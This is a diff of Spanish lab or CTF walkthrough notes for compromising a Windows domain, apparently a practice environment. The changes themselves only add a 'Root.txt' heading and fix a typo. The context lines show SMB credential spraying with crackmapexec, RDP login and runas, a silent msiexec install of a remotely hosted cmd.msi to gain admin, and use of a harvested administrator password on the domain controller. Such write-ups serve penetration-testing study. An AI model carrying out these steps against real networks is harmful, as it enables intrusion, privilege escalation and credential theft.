@@ -14,6 +14,7 @@ crackmapexec smb 192.168.56.0/24 -u "name" -p "pass"
 
 rdesktop -u 'user@domain' -p 'pass' IP -> El domain es genwin.local, lo sabemos porque lo hemos visto en el comando crackmapexec.
 
+Root.txt
 
 Una vez dentro, vemos los usuarios locales:
 net user y vemos que hay uno con nuestro mismo nombre, intentamos hacer un runas con las misma credenciales:
@@ -30,5 +31,5 @@ msiexec.exe /q /i http://IP/cmd.msi
 
 Ahora que somos admin, vamos al esritorio del administrador y vemos su contraseña en uno de los archivos. 
 
-Ahora ya podemo conectarnos al DC como administrador.
+Ahora ya podemos conectarnos al DC como administrador.
 
